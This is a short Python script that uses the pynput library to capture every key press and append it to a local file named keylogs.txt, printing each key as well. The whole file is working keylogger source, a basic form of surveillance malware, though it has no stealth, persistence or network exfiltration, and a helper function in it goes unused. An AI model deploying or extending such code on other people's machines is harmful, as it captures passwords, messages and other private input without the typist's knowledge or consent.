from pynput import keyboard
import os

class KeyLogger():
    def __init__(self, filename: str = "keylogs.txt") -> None:
        self.filename = filename
        self.filepath = os.path.join(os.path.dirname(__file__), filename)

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        print(key)
        with open(self.filepath, 'a') as logs:
            logs.write(str(key)+'\n')

    def main(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
        )
        listener.start()


if __name__ == '__main__':
    logger = KeyLogger()
    logger.main()
    input()
